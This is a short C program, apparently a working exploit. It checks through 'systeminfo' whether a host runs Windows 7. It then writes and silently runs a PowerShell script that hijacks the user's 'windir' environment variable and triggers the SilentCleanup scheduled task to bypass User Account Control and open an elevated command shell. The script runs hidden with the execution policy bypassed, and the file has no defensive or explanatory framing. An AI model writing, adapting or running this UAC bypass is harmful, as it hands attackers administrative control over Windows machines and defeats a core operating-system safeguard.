#include <stdio.h>
#include <string.h>

//method info
char TARGET_OS[10] = "Windows 7";
char BYPASSED_VERSION[10] = "99999";

int scan(){
    FILE *fp;
    char file_type[5500];
    char version[500];
    char os[500];
    char host_name[500];

    fp = popen("systeminfo", "r");
	while (fgets(file_type, sizeof(file_type), fp) != NULL) {
      printf("%s", file_type);
      if (strstr(file_type, "OS Version:") && version[0] == '\0'){
            strcpy(version, file_type);//version = file_type;
      }
      if (strstr(file_type, "OS Name:")){
            strcpy(os, file_type);//os = file_type;
      }

      if (strstr(file_type, "Host Name:")){
            strcpy(host_name, file_type);//host_name = file_type;
      }
    }
    printf("%s", os);
    printf("%s", version);
    printf("%s\n", host_name);

    if (strstr(os, TARGET_OS)&& !strstr(version, BYPASSED_VERSION)){
        printf("THIS %s is available to this uac bypass method 1", host_name);
        return 1;
    }
}

int start_payload(){
    int i;
	FILE *fp;
	fp = fopen("payload.ps1", "w");

	fprintf(fp, R"EOF(New-ItemProperty "HKCU:\Environment" -Name "windir" -Value "cmd.exe /k cmd.exe" -PropertyType String -Force
schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
    )EOF");
    system("powershell -executionpolicy bypass -windowstyle hidden payload.ps1");
    return 0;
}

int main(){
    if (scan() ==  1){
        start_payload();
    };
	return 0;
}
